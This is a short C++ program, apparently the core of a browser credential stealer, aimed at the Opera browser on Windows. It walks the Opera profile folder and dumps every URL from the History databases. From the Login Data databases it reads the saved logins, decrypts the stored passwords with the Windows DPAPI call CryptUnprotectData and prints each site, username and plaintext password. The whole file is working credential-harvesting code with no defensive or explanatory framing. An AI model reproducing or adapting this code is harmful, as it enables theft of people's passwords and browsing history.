#include <Windows.h>
#include <fstream>
#include <iostream>
#include "filefind.h"
#include "sqlite3.h"
#include <dpapi.h>
#pragma comment(lib,"Crypt32.lib")
int main() {
	
	
		opera::findfile hfile;
		hfile.getallfiles("C:\\Users\\pc\\AppData\\Roaming\\Opera Software", true, "History");
		for (size_t x = 0; x < hfile.files.size(); x++) {
			sqlite3* dbcon{};
			sqlite3_stmt* res{};
			if (sqlite3_open(hfile.files[x].c_str(), &dbcon)==SQLITE_OK) {
				if (sqlite3_prepare_v2(dbcon, "SELECT url FROM urls", -1, &res,NULL)==SQLITE_OK) {
					
					while (sqlite3_step(res) == SQLITE_ROW) {
						std::cout << sqlite3_column_text(res,0) << std::endl;
					
					}
				}
				else {
					std::cout << "sqliteprepare() " << sqlite3_errmsg(dbcon) << std::endl;
				}
			}
			else {
				std::cout << "sqliteopen() "<< sqlite3_errmsg(dbcon) <<std::endl;
			}
			sqlite3_finalize(res);
			sqlite3_close(dbcon);
			std::cout << "\n\n\n";
		}

		opera::findfile pfile;
		pfile.getallfiles("C:\\Users\\pc\\AppData\\Roaming\\Opera Software", true, "Login Data");
		for (size_t x = 0; x < pfile.files.size(); x++) {
			sqlite3* dbcon{};
			sqlite3_stmt* res{};
			if (sqlite3_open(pfile.files[x].c_str(), &dbcon) == SQLITE_OK) {
				if (sqlite3_prepare_v2(dbcon, "SELECT * FROM logins", -1, &res, NULL) == SQLITE_OK) {

					while (sqlite3_step(res) == SQLITE_ROW) {
					
						std::cout << "site:"<<sqlite3_column_text(res, 0) << std::endl;
						std::cout << sqlite3_column_text(res, 2) << sqlite3_column_text(res, 3) << std::endl;
						DATA_BLOB en, de;
						en.cbData = (DWORD)sqlite3_column_bytes(res, 5);
						en.pbData = (byte*)malloc((int)en.cbData);
						memcpy(en.pbData, sqlite3_column_blob(res, 5), (int)en.cbData);
						CryptUnprotectData(&en, NULL, NULL, NULL, NULL, 0, &de);
						std::cout << sqlite3_column_text(res, 4) << de.pbData << std::endl;
					}
				}
				else {
					std::cout << "sqliteprepare() " << sqlite3_errmsg(dbcon) << std::endl;
				}
			}
			else {
				std::cout << "sqliteopen() " << sqlite3_errmsg(dbcon) << std::endl;
			}
		}
	return 0;
}